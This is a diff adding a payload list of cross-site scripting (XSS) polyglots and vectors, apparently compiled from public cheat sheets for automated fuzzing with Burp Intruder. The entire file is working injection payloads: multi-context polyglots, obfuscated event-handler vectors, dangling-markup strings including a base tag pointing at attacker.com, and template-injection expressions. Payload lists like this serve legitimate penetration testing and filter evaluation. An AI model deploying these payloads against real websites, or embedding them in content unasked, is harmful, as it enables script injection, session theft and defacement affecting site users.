@@ -1,0 +1,37 @@
+# XSS Polyglots — SOTA collection
+# Sources: PayloadsAllTheThings/XSS Injection/2 - XSS Polyglot.md, PortSwigger XSS Cheat Sheet 2026, BruteLogic, filedescriptor polyglot challenge
+# Use: Burp Intruder first pass on unknown reflection context
+
+# --- Core polyglots (multi-context) ---
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">><marquee><img src=x onerror=confirm(1)></marquee></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm(1)"/alt="/"src="/"onerror=eval(id&%23x29;>
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+-->'" /></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+/svg/onload=alert(1)>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<math><mtext></mtext><mglyph><svg><mtext><textarea><path id=x></path><script>alert(1)</script></textarea></mglyph></svg></math>
+
+# --- Dangling markup / partial XSS ---
+<img src='aaa' onerror=alert(1)//
+<base href=//attacker.com/
+"><img src=x id=alert(1) onerror=eval(id)>
+
+# --- Template literal / modern JS ---
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
